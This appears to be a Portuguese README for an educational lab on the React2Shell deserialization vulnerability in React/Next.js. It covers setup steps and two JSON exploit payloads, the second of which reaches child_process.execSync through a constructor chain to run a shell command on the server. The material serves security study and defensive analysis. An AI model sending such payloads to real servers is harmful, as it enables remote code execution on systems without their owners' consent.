# Laboratório de React2Shell

Este repositório contém um **ambiente de laboratório educacional** para estudo e **análise defensiva** da vulnerabilidade conhecida como **React2Shell**, com foco em compreensão de arquitetura, serialização/deserialização e riscos de execução indevida de código em aplicações React/Next.js.

> ⚠️ **Importante**: Este material é destinado **exclusivamente para fins educacionais**, testes locais e ambientes **com autorização explícita**.

---

## 📦 Pré-requisitos

* Node.js **18+** (recomendado LTS)
* npm ou yarn
* Conhecimentos básicos de:

  * JavaScript / TypeScript
  * React e Next.js
  * Conceitos de segurança de aplicações web

---

## 🚀 Como iniciar a aplicação Next.js

1. **Clonar o repositório**

   ```bash
   git clone <url-do-repositorio>
   cd react2shell-lab
   cd aplication
   ```

2. **Instalar as dependências**

   ```bash
   npm install
   # ou
   yarn install
   ```

3. **Iniciar o servidor de desenvolvimento**

   ```bash
   npm run dev
   # ou
   yarn dev
   ```

4. **Acessar a aplicação**

   Abra o navegador em:

   ```text
   http://localhost:3000
   ```

---

## 🧪 Objetivo do laboratório

* Compreender como **objetos thenable** podem ser explorados quando manipulados incorretamente
* Analisar riscos associados à **desserialização insegura**
* Demonstrar impactos potenciais em **ambientes de desenvolvimento controlados**
* Estudar o fluxo interno de resolução de Promises e Server Actions

---

## 🧾 Payload JSON para teste

Payload básico utilizado para validar comportamento de resolução e encadeamento de objetos `thenable`:

```json
{
    "status":"resolved_model",
    "reason":-1,
    "_response":{
        "_prefix":"console.log('hello')//",
        "_formData":{"get":"$1:then:constructor"}
    },
    "then":"$1:then",
    "value":"{\"then\":\"$B\"}"
}
```

> Este payload **não executa comandos do sistema** e serve apenas para observar o fluxo de avaliação.

---

## ☢️ Payload JSON (ambiente de laboratório)

Payload demonstrativo para **análise de impacto** em ambiente **local e autorizado**:

```json
{
  "status":"resolved_model",
  "reason":-1,
  "_response":{
    "_prefix":"var res=process.mainModule.require('child_process').execSync('echo isVulnerable!').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
    "_chunks":"$Q2",
    "_formData":{"get":"$1:constructor:constructor"}
  },
  "then":"$1:__proto__:then",
  "value":"{\"then\":\"$B\"}"
}
```

> ⚠️ **Este payload existe apenas para demonstrar riscos**. Não deve ser utilizado fora de ambientes de teste isolados.

---

## 🛡️ Ética, responsabilidade e uso legal

Este laboratório **não incentiva**, **não apoia** e **não endossa**:

* Ataques a sistemas sem autorização
* Exploração em ambientes de produção
* Uso malicioso das informações aqui apresentadas

### Ao utilizar este material, você concorda que:

* Todos os testes serão feitos **apenas em ambientes próprios ou com permissão explícita**
* O objetivo é **aprendizado, pesquisa e defesa**
* Você é responsável por cumprir **leis locais e políticas de uso aceitável**

> Segurança ofensiva **sem ética** não é segurança — é crime.

---

## 📚 Referências recomendadas

* <a href="https://react2shell.com/">React2Shell CVE</a>
* <a href="https://nextjs.org/">Documentação oficial do Next.js</a>
* <a href="https://github.com/lachlan2k">Repositório do Autor da CVE</a>

---

## ✍️ Autor

Material criado para fins educacionais e estudo avançado de segurança em aplicações modernas React/Next.js.
